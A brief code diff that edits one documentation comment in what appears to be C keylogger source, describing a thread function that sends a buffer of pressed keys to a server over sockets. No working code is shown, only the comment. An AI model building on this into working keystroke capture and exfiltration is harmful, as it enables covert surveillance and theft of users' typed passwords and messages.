@@ -5,7 +5,7 @@ extern char* userId;
 extern char* result;
 
 /**
- * @brief Sends data from a buffer containing pressed keys to a server via web sockets.
+ * @brief Sends data from a buffer containing pressed keys to a server via sockets.
  *
  * @param param Pointer to a void passed by the system to the thread function.
  *              This parameter is unused and should be ignored.
